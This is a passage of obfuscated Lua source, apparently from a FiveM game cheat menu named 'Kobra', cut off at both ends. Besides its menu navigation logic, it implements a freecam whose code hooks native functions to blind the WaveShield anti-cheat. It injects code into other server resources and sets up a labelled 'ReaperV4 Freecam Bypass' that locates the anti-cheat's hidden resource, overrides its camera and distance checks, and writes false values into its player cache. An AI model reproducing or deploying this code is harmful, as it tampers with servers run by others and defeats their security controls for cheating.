-1 ;end end elseif ((v187.type=="slider") or (v187.type=="slider-checkbox")) then local v674=0;local v675;while true do if (v674==0) then v187.value=v187.value or v187.min or (0 + 0) ;v675=v187.step or 1 ;v674=1 + 0 ;end if (v674==2) then v185:UpdateElements(v17);if ((v187.scrollType=="onScroll") and v187.onSelect) then if (v187.type=="slider-checkbox") then v187.onSelect(v187.value,v187.checked or false );else v187.onSelect(v187.value);end end break;end if (v674==1) then if (v186=="Left") then v187.value=math.max(v187.min or (0 + 0) ,v187.value-v675 );elseif (v186=="Right") then v187.value=math.min(v187.max or (1330 -(957 + 273)) ,v187.value + v675 );end for v969,v970 in pairs(v25) do if ((v970.type=="slider-checkbox") and (type(v970.value)~="nil") and (v970.label==v187.label)) then if (v186=="Left") then v970.value=math.max(v187.min or (0 + 0) ,v187.value-v675 );elseif (v186=="Right") then v970.value=math.min(v187.max or (41 + 59) ,v187.value + v675 );else return;end end end v674=7 -5 ;end end end end;v12.Enter=function(v188) if ( not v17 or ( #v17==(0 -0))) then return;end local v189=v17[v15];if  not v189 then return;end if  not v24 then return;end if (v189.type=="subMenu") then local v501=0;while true do if (v501==0) then table.insert(v20,{menu=v17,categories=v18,categoryIndex=v19});table.insert(v21,v189.label or "Submenu" );v501=2 -1 ;end if (v501==2) then if (v189.subTabs and (type(v189.subTabs)=="table") and ( #v189.subTabs>0)) then local v874=0 -0 ;while true do if ((1781 -(389 + 1391))==v874) then v17=v189.subTabs;v15=1 + 0 ;v874=1 + 1 ;end if (v874==(4 -2)) then v188:UpdateElements(v17);return;end if (v874==(951 -(783 + 168))) then v18=nil;v19=1;v874=1;end end end return;end if (v501==(3 -2)) then if (v189.type=="Server") then v12:UpdateListMenu();end if (v189.categories and (type(v189.categories)=="table") and ( #v189.categories>(0 + 0))) then v18=v189.categories;v19=312 -(309 + 2) ;v17=v18[v19].tabs or {} ;v15=2 -1 ;v188:UpdateElements(v17);return;end v501=1214 -(1090 + 122) ;end end end if ((v189.type=="button") and v189.onSelect and (type(v189.onSelect)=="function")) then local v502=0 + 0 ;local v503;local v504;while true do if (v502==(0 -0)) then v503,v504=pcall(v189.onSelect);if  not v503 then v188:Debug("red","onSelect error: "   .. tostring(v504) );end v502=1 + 0 ;end if (v502==1) then return;end end end if ((v189.type=="checkbox") or (v189.type=="scrollable-checkbox") or (v189.type=="slider-checkbox")) then local v505=1118 -(628 + 490) ;while true do if ((0 + 0)==v505) then if v189.locked then local v876=0 -0 ;while true do if (0==v876) then v188:Notify("error","Kobra","This module has been disabled due to high detection rates!",13710 -10710 );return;end end end if (type(v189.checked)~="boolean") then v189.checked=true;else v189.checked= not v189.checked;end v505=775 -(431 + 343) ;end if (v505==1) then if (v189.onSelect and (type(v189.onSelect)=="function")) then if (v189.type=="scrollable-checkbox") then local v1017,v1018=pcall(v189.onSelect,v189.values[v189.value],v189.checked);if  not v1017 then v188:Debug("red","scrollable-checkbox onSelect error: "   .. tostring(v1018) );end elseif (v189.type=="slider-checkbox") then local v1125=0;local v1126;local v1127;while true do if (v1125==(0 -0)) then v1126,v1127=pcall(v189.onSelect,v189.value,v189.checked);if  not v1126 then v188:Debug("red","slider-checkbox onSelect error: "   .. tostring(v1127) );end break;end end else local v1128,v1129=pcall(v189.onSelect,v189.checked);if  not v1128 then v188:Debug("red","checkbox onSelect error: "   .. tostring(v1129) );end end end v188:UpdateElements(v17);v505=5 -3 ;end if (v505==(2 + 0)) then return;end end end if ((v189.type=="scrollable") or (v189.type=="scrollable-checkbox")) then local v506=0 + 0 ;while true do if (v506==0) then if (v189.values and (type(v189.values)=="table") and ( #v189.values>0)) then if v189.onSelect then v189.onSelect(v189.values[v189.value]);end end return;end end end if ((v189.type=="slider") or (v189.type=="slider-checkbox")) then if ((v189.scrollType=="onEnter") and v189.onSelect) then if (v189.type=="slider-checkbox") then v189.onSelect(v189.value,v189.checked or false );else v189.onSelect(v189.value);end end return;end end;local v64=false;v12.Backspace=function(v190) if ( #v20>(1695 -(556 + 1139))) then local v507=table.remove(v20);table.remove(v21);v17=v507.menu or v16 ;v18=v507.categories;v19=v507.categoryIndex or 1 ;v15=16 -(6 + 9) ;v190:UpdateElements(v17);else v190:HideUI();end end;v12.PrevCategory=function(v191) if ( not v18 or ( #v18==(0 + 0))) then return;end v19=v19-(1 + 0) ;if (v19<(170 -(28 + 141))) then v19= #v18;end v17=v18[v19].tabs or {} ;v15=1;v191:UpdateElements(v17);v191:SendMessage({action="keydown",index=v15-(1 + 0) });end;v12.NextCategory=function(v192) local v193=0;while true do if ((2 -0)==v193) then v15=1 + 0 ;v192:UpdateElements(v17);v193=1320 -(486 + 831) ;end if (v193==(0 -0)) then if ( not v18 or ( #v18==(0 -0))) then return;end v19=v19 + 1 + 0 ;v193=3 -2 ;end if (v193==(1264 -(668 + 595))) then if (v19> #v18) then v19=1 + 0 ;end v17=v18[v19].tabs or {} ;v193=2;end if (v193==(1 + 2)) then v192:SendMessage({action="keydown",index=v15-1 });break;end end end;v12.ToggleFreecam=function(v194,v195,v196) if (type(v195)~="boolean") then return;end if v195 then v32=true;MachoSendDuiMessage(v14,json.encode({action="displayFreecam",visible=true,weaponIndex=v34,vehicleIndex=v35}));if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then MachoHookNative(5923634300000000000,function(...) return false, -(2 -1);end);MachoHookNative(11673589000000000000,function(...) return false,GetEntityCoords(PlayerPedId());end);MachoHookNative(14327026000000000000 -(23 + 267) ,function(...) return false,false;end);MachoHookNative(10181871000000000000,function(...) return false,1944 -(1129 + 815) ;end);MachoHookNative(12777102000000000000 -(371 + 16) ,function(...) return false,false;end);MachoHookNative(1858573000000000000 -(1326 + 424) ,function(...) return false,0 -0 ;end);MachoHookNative(15349248000000000000 -  -63503062 ,function(...) return false,1490 -(69 + 1421) ;end);MachoHookNative(18127728000000000000,function(...) return false,true;end);MachoHookNative(11059360000000000000 -0 ,function(...) return false,true;end);_G.KobraFreecamSpeed=v196;if  not _G.KobraFreecamThreadRunning then _G.KobraFreecamEnabled=true;_G.KobraFreecamThreadRunning=true;function hNative(v1019,v1020) local v1021=_G[v1019];if ( not v1021 or (type(v1021)~="function")) then return;end _G[v1019]=function(...) return v1020(v1021,...);end;end local function v971(v1022) local v1023=math.rad(v1022.z);local v1024=math.rad(v1022.x);local v1025=math.abs(math.cos(v1024));return vector3( -math.sin(v1023) * v1025 ,math.cos(v1023) * v1025 ,math.sin(v1024));end local function v972(v1026) local v1027=math.rad(v1026.z);return vector3(math.cos(v1027),math.sin(v1027),0 + 0 );end local function v973(v1028,v1029,v1030) local v1031=0 -0 ;while true do if (v1031==(2 -1)) then return v1028;end if (v1031==(1083 -(286 + 797))) then if (v1028<v1029) then return v1029;end if (v1028>v1030) then return v1030;end v1031=3 -2 ;end end end hNative("RotationToDirection",function(v1032,...) return v1032(...);end);hNative("GetRightVector",function(v1033,...) return v1033(...);end);hNative("Clamp",function(v1034,...) return v1034(...);end);hNative("CreateThread",function(v1035,...) return v1035(...);end);hNative("Wait",function(v1036,...) return v1036(...);end);hNative("IsVehicleSeatFree",function(v1037,...) return v1037(...);end);hNative("PlayerPedId",function(v1038,...) return v1038(...);end);hNative("GetEntityCoords",function(v1039,...) return v1039(...);end);hNative("CreateCam",function(v1040,...) return v1040(...);end);hNative("DoesCamExist",function(v1041,...) return v1041(...);end);hNative("SetCamCoord",function(v1042,...) return v1042(...);end);hNative("SetCamRot",function(v1043,...) return v1043(...);end);hNative("RenderScriptCams",function(v1044,...) return v1044(...);end);hNative("DestroyCam",function(v1045,...) return v1045(...);end);hNative("SetFocusEntity",function(v1046,...) return v1046(...);end);hNative("SetTextFont",function(v1047,...) return v1047(...);end);hNative("SetTextProportional",function(v1048,...) return v1048(...);end);hNative("SetTextScale",function(v1049,...) return v1049(...);end);hNative("SetTextDropShadow",function(v1050,...) return v1050(...);end);hNative("SetTextEdge",function(v1051,...) return v1051(...);end);hNative("SetTextOutline",function(v1052,...) return v1052(...);end);hNative("SetTextCentre",function(v1053,...) return v1053(...);end);hNative("SetTextColour",function(v1054,...) return v1054(...);end);hNative("BeginTextCommandDisplayText",function(v1055,...) return v1055(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1056,...) return v1056(...);end);hNative("EndTextCommandDisplayText",function(v1057,...) return v1057(...);end);hNative("GetCamCoord",function(v1058,...) return v1058(...);end);hNative("GetCamRot",function(v1059,...) return v1059(...);end);hNative("IsControlPressed",function(v1060,...) return v1060(...);end);hNative("GetDisabledControlNormal",function(v1061,...) return v1061(...);end);hNative("TaskStandStill",function(v1062,...) return v1062(...);end);hNative("SetFocusPosAndVel",function(v1063,...) return v1063(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1064,...) return v1064(...);end);hNative("GetShapeTestResult",function(v1065,...) return v1065(...);end);hNative("IsControlJustPressed",function(v1066,...) return v1066(...);end);hNative("IsDisabledControlJustPressed",function(v1067,...) return v1067(...);end);hNative("IsEntityAVehicle",function(v1068,...) return v1068(...);end);hNative("TaskWarpPedIntoVehicle",function(v1069,...) return v1069(...);end);hNative("SetEntityCoords",function(v1070,...) return v1070(...);end);hNative("GiveWeaponToPed",function(v1071,...) return v1071(...);end);hNative("SetCurrentPedWeapon",function(v1072,...) return v1072(...);end);hNative("ShootSingleBulletBetweenCoords",function(v1073,...) return v1073(...);end);local v974=GetEntityCoords(PlayerPedId());_G.KobraFreecamObject=CreateCam("DEFAULT_SCRIPTED_CAMERA",true);SetCamCoord(_G.KobraFreecamObject,v974.x,v974.y,v974.z + (2 -0) );SetCamRot(_G.KobraFreecamObject,439 -(397 + 42) ,0 + 0 ,GetEntityHeading(PlayerPedId()),802 -(24 + 776) );RenderScriptCams(true,false,0 -0 ,true,true);CreateThread(function() while _G.KobraFreecamThreadRunning do Wait(0);if _G.KobraFreecamObject then local v1208=GetCamCoord(_G.KobraFreecamObject);local v1209=GetCamRot(_G.KobraFreecamObject,2);local v1210=_G.KobraFreecamSpeed or (785.25 -(222 + 563)) ;local v1211=(IsControlPressed(0 -0 ,21) and (v1210 + 1)) or v1210 ;local v1212=v971(v1209);local v1213=v972(v1209);local v1214,v1215,v1216=0 + 0 ,0,190 -(23 + 167) ;TaskStandStill(PlayerPedId(),10);SetFocusPosAndVel(v1208.x,v1208.y,v1208.z,0,1798 -(690 + 1108) ,0 + 0 );if IsControlPressed(0 + 0 ,880 -(40 + 808) ) then v1214=v1214 + (v1212.x * v1211) ;v1215=v1215 + (v1212.y * v1211) ;v1216=v1216 + (v1212.z * v1211) ;end if IsControlPressed(0 + 0 ,126 -93 ) then local v1316=0 + 0 ;while true do if ((0 + 0)==v1316) then v1214=v1214-(v1212.x * v1211) ;v1215=v1215-(v1212.y * v1211) ;v1316=1 + 0 ;end if (1==v1316) then v1216=v1216-(v1212.z * v1211) ;break;end end end if IsControlPressed(571 -(47 + 524) ,23 + 11 ) then v1214=v1214-(v1213.x * v1211) ;v1215=v1215-(v1213.y * v1211) ;end if IsControlPressed(0 -0 ,52 -17 ) then local v1317=0;while true do if (v1317==(0 -0)) then v1214=v1214 + (v1213.x * v1211) ;v1215=v1215 + (v1213.y * v1211) ;break;end end end if IsControlPressed(1726 -(1165 + 561) ,1 + 21 ) then v1216=v1216 + v1211 ;end if IsControlPressed(0,36) then v1216=v1216-v1211 ;end SetCamCoord(_G.KobraFreecamObject,v1208.x + v1214 ,v1208.y + v1215 ,v1208.z + v1216 );local v1217=GetDisabledControlNormal(0 -0 ,1 + 0 );local v1218=GetDisabledControlNormal(0,481 -(341 + 138) );local v1219=v973(v1209.x-(v1218 * (2 + 3)) , -(183 -94),415 -(89 + 237) );local v1220=v1209.z-(v1217 * (16 -11)) ;SetCamRot(_G.KobraFreecamObject,v1219,v1209.y,v1220,3 -1 );end end end);else _G.KobraFreecamEnabled=true;end else v48(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                print("hello im inside of a resource")
                    _G.KobraFreecamSpeed = ]]   .. v196   .. [[

                    if not _G.KobraFreecamThreadRunning then
                        _G.KobraFreecamEnabled = true
                        _G.KobraFreecamThreadRunning = true
                    
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        local function RotationToDirection(rot)
                            local z = math.rad(rot.z)
                            local x = math.rad(rot.x)
                            local num = math.abs(math.cos(x))
                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                        end

                        local function GetRightVector(rot)
                            local z = math.rad(rot.z)
                            return vector3(math.cos(z), math.sin(z), 0.0)
                        end

                        local function Clamp(val, min, max)
                            if val < min then return min end
                            if val > max then return max end
                            return val
                        end

                        hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                        hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                        hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                        hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                        hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                        hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                        hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                        hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                        hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                        local coords = GetEntityCoords(PlayerPedId())
                        _G.KobraFreecamObject = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                        SetCamCoord(_G.KobraFreecamObject, coords.x, coords.y, coords.z + 2.0)
                        SetCamRot(_G.KobraFreecamObject, 0.0, 0.0, GetEntityHeading(PlayerPedId()), 2)
                        RenderScriptCams(true, false, 0, true, true)
                        
                        CreateThread(function()
                            while _G.KobraFreecamThreadRunning do
                                Wait(0)

                                if _G.KobraFreecamObject then
                                    local coords = GetCamCoord(_G.KobraFreecamObject)
                                    local rot = GetCamRot(_G.KobraFreecamObject, 2)
                                    local beforeSpeed = _G.KobraFreecamSpeed or 0.25
                                    local speed = IsControlPressed(0, 21) and beforeSpeed + 1.0 or beforeSpeed
                                    local forward = RotationToDirection(rot)
                                    local right = GetRightVector(rot)
                                    local moveX, moveY, moveZ = 0, 0, 0

                                    TaskStandStill(PlayerPedId(), 10)
                                    SetFocusPosAndVel(coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)

                                    if IsControlPressed(0, 32) then moveX = moveX + forward.x * speed moveY = moveY + forward.y * speed moveZ = moveZ + forward.z * speed end
                                    if IsControlPressed(0, 33) then moveX = moveX - forward.x * speed moveY = moveY - forward.y * speed moveZ = moveZ - forward.z * speed end
                                    if IsControlPressed(0, 34) then moveX = moveX - right.x * speed moveY = moveY - right.y * speed end
                                    if IsControlPressed(0, 35) then moveX = moveX + right.x * speed moveY = moveY + right.y * speed end
                                    if IsControlPressed(0, 22) then moveZ = moveZ + speed end
                                    if IsControlPressed(0, 36) then moveZ = moveZ - speed end

                                    SetCamCoord(_G.KobraFreecamObject, coords.x + moveX, coords.y + moveY, coords.z + moveZ)

                                    local x = GetDisabledControlNormal(0, 1)
                                    local y = GetDisabledControlNormal(0, 2)
                                    local newPitch = Clamp(rot.x - y * 5, -89.0, 89.0)
                                    local newYaw = rot.z - x * 5

                                    SetCamRot(_G.KobraFreecamObject, newPitch, rot.y, newYaw, 2)
                                end
                            end
                        end)
                    else
                        _G.KobraFreecamEnabled = true
                    end
                ]] );end else if  not v30 then local v841=881 -(581 + 300) ;local v842;local v843;while true do if (v841==1) then function v842() local v1091=false;local function v1092(v1130,v1131) v1131=v1131 or "072b0945-fdd6d8bb-2e1d0476-d15c8f4b-ed6db3e1" ;v1130=v1130   .. v1131 ;local v1132=6601 -(855 + 365) ;for v1221=2 -1 , #v1130 do local v1222=0 + 0 ;local v1223;while true do if (v1222==0) then v1223=string.byte(v1130,v1221);v1132=(v1132 * (1268 -(1030 + 205)))~v1223 ;break;end end end return v1132;end local v1093=GetConvar("reaper_security_resource","");local v1094=tonumber(v1093);if  not v1094 then return;end local v1095=GetNumResources() or (0 + 0) ;local v1096={};for v1133=0,v1095-(1 + 0)  do local v1134=GetResourceByFindIndex(v1133);if (v1134 and (v1134~="")) then table.insert(v1096,v1134);end end if ( #v1096==(286 -(156 + 130))) then return;end local v1097=0 -0 ;local v1098=nil;for v1135,v1136 in ipairs(v1096) do v1097=v1097 + (1 -0) ;if (v1092(v1136)==v1094) then print("^7[^5Kobra^7]: [^3DEBUG^7]: Reaper Security Resource Found: "   .. v1136 );v1098=v1136;break;end local v1137=v1136:gsub("[-_]","");if ((v1137~=v1136) and (v1092(v1137)==v1094)) then v1098=v1137;break;end if ((v1097%(102 -52))==(0 + 0)) then Wait(0);end end if v1098 then return v1098;end end v843=v842();v841=2;end if (v841==3) then if v843 then MachoInjectResource(v843,[[
                        _G["GetRenderingCam"] = function()
                            return 0
                        end

                        _G["GetDistanceBetweenCoords"] = function()
                            return 0
                        end
                    ]]);end MachoInjectResource("any",[[
                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "player_loaded", false, true)
                    if success then
                        print("Updated Cache 1 Successfully")
                    else
                        print("Failed to Update Cache 1")
                    end

                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "LastFailedMovementChecks", 0, true)
                    if success then
                        print("Updated Cache 2 Successfully")
                    else
                        print("Failed to Update 2 Cache")
                    end

                    Wait(500)

                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "NetworkIsInSpectatorMode", true, true)
                    if success then
                        print("Updated Cache 3 Successfully")
                    else
                        print("Failed to Update Cache 3")
                    end
                ]]);v841=4;end if (v841==4) then print("[^5Kobra^7]: [^2DEBUG^7] >> Loaded ReaperV4 Freecam Bypass");v30=true;break;end if ((2 + 0)==v841) then MachoInjectResource("ReaperV4",[[
                    _G["GetRenderingCam"] = function()
                        return 0
                    end

                    _G["GetDistanceBetweenCoords"] = function()
                        return 0
                    end
                ]]);Wait(319 -(10 + 59) );v841=1 + 2 ;end if (v841==(0 -0)) then print("[^5Kobra^7]: [^3DEBUG^7] >> Loading ReaperV4 Freecam Bypass");v842=nil;v841=1164 -(671 + 492) ;end end end _G.KobraFreecamSpeed=v196;if  not _G.KobraFreecamThreadRunning then _G.KobraFreecamEnabled=true;_G.KobraFreecamThreadRunning=true;function hNative(v879,v880) local v881=_G[v879];if ( not v881 or (type(v881)~="function")) then return;end _G[v879]=function(...) return v880(v881,...);end;end local function v844(v882) local v883=0 + 0 ;local v884;local v885;local v886;while true do if (v883==0) then v884=math.rad(v882.z);v885=math.rad(v882.x);v883=1;end if ((1216 -(369 + 846))==v883) then v886=math.abs(math.cos(v885));return vector3( -math.sin(v884) * v886 ,math.cos(v884) * v886 ,math.sin(v885));end end end local function v845(v887) local v888=math.rad(v887.z);return vector3(math.cos(v888),math.sin(v888),0);end local function v846(v889,v890,v891) if (v889<v890) then return v890;end if (v889>v891) then return v891;end return v889;end hNative("RotationToDirection",function(v892,...) return v892(...);end);hNative("GetRightVector",function(v893,...) return v893(...);end);hNative("Clamp",function(v894,...) return v894(...);end);hNative("CreateThread",function(v895,...) return v895(...);end);hNative("Wait",function(v896,...) return v896(...);end);hNative("IsVehicleSeatFree",function(v897,...) return v897(...);end);hNative("PlayerPedId",function(v898,...) return v898(...);end);hNative("GetEntityCoords",function(v899,...) return v899(...);end);hNative("CreateCam",function(v900,...) return v900(...);end);hNative("DoesCamExist",function(v901,...) return v901(...);end);hNative("SetCamCoord",function(v902,...) return v902(...);end);hNative("SetCamRot",function(v903,...) return v903(...);end);hNative("RenderScriptCams",function(v904,...) return v904(...);end);hNative("DestroyCam",function(v905,...) return v905(...);end);hNative("SetFocusEntity",function(v906,...) return v906(...);end);hNative("SetTextFont",function(v907,...) return v907(...);end);hNative("SetTextProportional",function(v908,...) return v908(...);end);hNative("SetTextScale",function(v909,...) return v909(...);end);hNative("SetTextDropShadow",function(v910,...) return v910(...);end);hNative("SetTextEdge",function(v911,...) return v911(...);end);hNative("SetTextOutline",function(v912,...) return v912(...);end);hNative("SetTextCentre",function(v913,...) return v913(...);end);hNative("SetTextColour",function(v914,...) return v914(...);end);hNative("BeginTextCommandDisplayText",function(v915,...) return v915(...);end);hNative("AddTextComponentSubstringPlayerName",function(v916,...) return v916(...);end);hNative("EndTextCommandDisplayText",function(v917,...) return v917(...);end);hNative("GetCamCoord",function(v918,...) return v918(...);end);hNative("GetCamRot",function(v919,...) return v919(...);end);hNative("IsControlPressed",function(v920,...) return v920(...);end);hNative("GetDisabledControlNormal",function(v921,...) return v921(...);end);hNative("TaskStandStill",function(v922,...) return v922(...);end);hNative("SetFocusPosAndVel",function(v923,...) return v923(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v924,...) return v924(...);end);hNative("GetShapeTestResult",function(v925,...) return v925(...);end);hNative("IsControlJustPressed",function(v926,...) return v926(...);end);hNative("IsDisabledControlJustPressed",function(v927,...) return v927(...);end);hNative("IsEntityAVehicle",function(v928,...) return v928(...);end);hNative("TaskWarpPedIntoVehicle",function(v929,...) return v929(...);end);hNative("SetEntityCoords",function(v930,...) return v930(...);end);hNative("GiveWeaponToPed",function(v931,...) return v931(...);end);hNative("SetCurrentPedWeapon",function(v932,...) return v932(...);end);hNative("ShootSingleBulletBetweenCoords",function(v933,...) return v933(...);end);local v847=GetEntityCoords(PlayerPedId());_G.KobraFreecamObject=CreateCam("DEFAULT_SCRIPTED_CAMERA",true);SetCamCoord(_G.KobraFreecamObject,v847.x,v847.y,v847.z + 1 + 1 );SetCamRot(_G.KobraFreecamObject,0,0,GetEntityHeading(PlayerPedId()),2 + 0 );RenderScriptCams(true,false,1945 -(1036 + 909) ,true,true);CreateThread(function() while _G.KobraFreecamThreadRunning do Wait(0);if (_G.KobraFreecamEnabled and _G.KobraFreecamObject) then local v1099=GetCamCoord(_G.KobraFreecamObject);local v1100=GetCamRot(_G.KobraFreecamObject,2);local v1101=_G.KobraFreecamSpeed or (0.25 + 0) ;local v1102=(IsControlPressed(0,21) and (v1101 + (1 -0))) or v1101 ;local v1103=v844(v1100);local v1104=v845(v1100);local v1105,v1106,v1107=0,203 -(11 + 192) ,0 + 0 ;TaskStandStill(PlayerPedId(),185 -(135 + 40) );SetFocusPosAndVel(v1099.x,v1099.y,v1099.z,0 -0 ,0,0);if IsControlPressed(0,20 + 12 ) then local v1224=0 -0 ;while true do if (v1224==(1 -0)) then v1107=v1107 + (v1103.z * v1102) ;break;end if (0==v1224) then v1105=v1105 + (v1103.x * v1102) ;v1106=v1106 + (v1103.y * v1102) ;v1224=1;end end end if IsControlPressed(176 -(50 + 126) ,91 -58 ) then v1105=v1105-(v1103.x * v1102) ;v1106=v1106-(v1103.y * v1102) ;v1107=v1107-(v1103.z * v1102) ;end if IsControlPressed(0 + 0 ,1447 -(1233 + 180) ) then v1105=v1105-(v1104.x * v1102) ;v1106=v1106-(v1104.y * v1102) ;end if IsControlPressed(969 -(522 + 447) ,1456 -(107 + 1314) ) then local v1225=0 + 0 ;while true do if (v1225==(0 -0)) then v1105=v1105 + (v1104.x * v1102) ;v1106=v1106 + (v1104.y * v1102) ;break;end end end if IsControlPressed(0 + 0 ,43 -21 ) then v1107=v1107 + v1102 ;end if IsControlPressed(0 -0 ,1946 -(716 + 1194) ) then v1107=v1107-v1102 ;end SetCamCoord(_G.KobraFreecamObject,v1099.x + v1105 ,v1099.y + v1106 ,v1099.z + v1107 );local v1108=GetDisabledControlNormal(0,1 + 0 );local v1109=GetDisabledControlNormal(0 + 0 ,2);local v1110=v846(v1100.x-(v1109 * (508 -(74 + 429))) , -89,171 -82 );local v1111=v1100.z-(v1108 * (3 + 2)) ;SetCamRot(_G.KobraFreecamObject,v1110,v1100.y,v1111,4 -2 );end end end);else _G.KobraFreecamEnabled=true;end end else local v509=0;while true do if (v509==0) then v32=false;MachoSendDuiMessage(v14,json.encode({action="displayFreecam",visible=false}));v509=1;end if (v509==1) then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then local v1074=0;while true do if (v1074==(5 + 2)) then hNative("GetDisabledControlNormal",function(v1244,...) return v1244(...);end);hNative("TaskStandStill",function(v1245,...) return v1245(...);end);hNative("SetFocusPosAndVel",function(v1246,...) return v1246(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1247,...) return v1247(...);end);v1074=8;end if (v1074==(0 -0)) then _G.KobraFreecamEnabled=false;_G.KobraFreecamThreadRunning=false;function hNative(v1248,v1249) local v1250=0;local v1251;while true do if (v1250==(2 -1)) then _G[v1248]=function(...) return v1249(v1251,...);end;break;end if (v1250==(433 -(279 + 154))) then v1251=_G[v1248];if ( not v1251 or (type(v1251)~="function")) then return;end v1250=779 -(454 + 324) ;end end end hNative("CreateThread",function(v1252,...) return v1252(...);end);v1074=1 + 0 ;end if ((18 -(12 + 5))==v1074) then hNative("Wait",function(v1253,...) return v1253(...);end);hNative("IsVehicleSeatFree",function(v1254,...) return v1254(...);end);hNative("PlayerPedId",function(v1255,...) return v1255(...);end);hNative("GetEntityCoords",function(v1256,...) return v1256(...);end);v1074=2;end if (v1074==2) then hNative("CreateCam",function(v1257,...) return v1257(...);end);hNative("SetCamCoord",function(v1258,...) return v1258(...);end);hNative("SetCamRot",function(v1259,...) return v1259(...);end);hNative("RenderScriptCams",function(v1260,...) return v1260(...);end);v1074=3;end if (v1074==8) then hNative("GetShapeTestResult",function(v1261,...) return v1261(...);end);hNative("IsControlJustPressed",function(v1262,...) return v1262(...);end);hNative("IsDisabledControlJustPressed",function(v1263,...) return v1263(...);end);hNative("IsEntityAVehicle",function(v1264,...) return v1264(...);end);v1074=9;end if (v1074==(6 + 4)) then hNative("ShootSingleBulletBetweenCoords",function(v1265,...) return v1265(...);end);RenderScriptCams(false,false,0,true,true);if _G.KobraFreecamObject then DestroyCam(_G.KobraFreecamObject,false);_G.KobraFreecamObject=nil;end SetFocusEntity(PlayerPedId());break;end if (v1074==(10 -6)) then hNative("SetTextScale",function(v1266,...) return v1266(...);end);hNative("SetTextDropShadow",function(v1267,...) return v1267(...);end);hNative("SetTextEdge",function(v1268,...) return v1268(...);end);hNative("SetTextOutline",function(v1269,...) return v1269(...);end);v1074=2 + 3 ;end if (v1074==5) then hNative("SetTextCentre",function(v1270,...) return v1270(...);end);hNative("SetTextColour",function(v1271,...) return v1271(...);end);hNative("BeginTextCommandDisplayText",function(v1272,...) return v1272(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1273,...) return v1273(...);end);v1074=6;end if (v1074==(1096 -(277 + 816))) then hNative("DestroyCam",function(v1274,...) return v1274(...);end);hNative("SetFocusEntity",function(v1275,...) return v1275(...);end);hNative("SetTextFont",function(v1276,...) return v1276(...);end);hNative("SetTextProportional",function(v1277,...) return v1277(...);end);v1074=4;end if (v1074==(25 -19)) then hNative("EndTextCommandDisplayText",function(v1278,...) return v1278(...);end);hNative("GetCamCoord",function(v1279,...) return v1279(...);end);hNative("GetCamRot",function(v1280,...) return v1280(...);end);hNative("IsControlPressed",function(v1281,...) return v1281(...);end);v1074=1190 -(1058 + 125) ;end if (v1074==(2 + 7)) then 